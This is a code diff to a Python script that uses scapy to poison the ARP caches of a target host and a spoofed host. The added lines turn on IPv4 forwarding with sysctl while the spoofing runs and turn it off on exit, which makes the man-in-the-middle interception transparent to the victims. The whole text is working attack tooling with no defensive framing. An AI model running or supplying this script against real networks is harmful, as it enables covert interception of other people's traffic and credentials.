@@ -4,6 +4,7 @@ import scapy.all as scapy
 import time
 import sys
 import argparse
+import subprocess
 
 def spoof_sender(target_ip,spoof_ip):
     response=scapy.ARP(op=2,psrc=spoof_ip,hwdst=net_scan(target_ip),pdst=target_ip)
@@ -37,6 +38,8 @@ elif not spoof_ip:
     exit()
 try:
     pckt_ctr=0
+    print("[+]Enabled port forwarding:")
+    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
     while True:
         spoof_sender(target_ip,spoof_ip)
         spoof_sender(spoof_ip,target_ip)
@@ -48,3 +51,5 @@ except KeyboardInterrupt:
     print("\n[+]Quitting...And restoring...")
     restore(target_ip,spoof_ip)
     restore(spoof_ip,target_ip)
+    print("[+]Disabling port forwarding")
+    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
